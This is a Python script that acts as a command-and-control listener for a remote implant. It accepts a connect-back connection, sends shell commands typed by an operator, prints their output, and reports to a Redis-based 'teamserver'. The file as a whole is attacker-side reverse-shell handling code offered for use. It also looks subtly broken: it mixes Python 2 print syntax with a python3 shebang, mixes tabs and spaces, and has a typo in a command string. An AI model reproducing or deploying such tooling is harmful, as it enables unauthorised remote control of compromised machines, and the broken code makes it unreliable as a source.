#!/usr/bin/python3
from socket import *
from settings import r
import pexpect
import subprocess
import redis
import sys

class simple():

	def __init__(self, teamserver, HOST, PORT):
        	self.ts = teamserver
		self.h = HOST
		self.p = PORT
		self.lid = "%s:%s" % (HOST,PORT)
		self.channel = self.lid + '-cmd'
		self.pubsub = self.ts.pubsub()
		self.ts.lpush(self.lid, 'hostneame')
		self.result = self.lid + '-out'
		self.ts.publish('Listeners', self.lid)

	def screenList(self):
		print "Identify the session you want:"
		subprocess.call(['screen', '-ls'])
		s = raw_input('Select the first four:')
		subprocess.call(["screen", '-r', s])
		

	def startSimple(self):
		#HOST = ''                 # '' means bind to all interfaces
		#PORT = 443                #  port 
		# create our socket handler
		s = socket(AF_INET, SOCK_STREAM)
		# set is so that when we cancel out we can reuse port
		s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
		# bind to interface
		s.bind((self.h, self.p))
		# print we are accepting connections
		print "Listening on 0.0.0.0:%s" % str(self.p)
		# listen for only 10 connection
		s.listen(10)
		# accept connections
		conn, addr = s.accept()
		# print connected by ipaddress
		print 'Connected by', addr
		# receive initial connection
		data = conn.recv(1024)
		# start loop
		channel = self.channel
		result = self.result
		self.pubsub.subscribe(channel)
		#print channel
		print 'Enter shell command or "quit" to quit:'
		print 'Enter "back" to quit and leave the implant running:'
		while 1:
			#for item in self.pubsub.listen():
			#	command = item['data']
			#	if command == 1:
			#		command = 'hostname'
			#	break
			command = raw_input("Shell: ")
			command = command + ' '
			# send shell command
			conn.send(str(command))
			# if we specify quit then kill implant, break out of loop and close socket
			if command == "quit ":
				conn.send(str(command)) 
				break
			# if we specify back then break out of loop and close socket
                        if command == "back ": break
			# receive output from linux command
			data = conn.recv(1024)
			# print the output of the linux command
			print data
			#self.ts.publish(str(result), data)
		# close socket
		conn.close()

if __name__ == "__main__":
	r = redis.Redis(host='localhost', port=6379)
	client = simple(r, sys.argv[1], int(sys.argv[2]))
	client.startSimple()

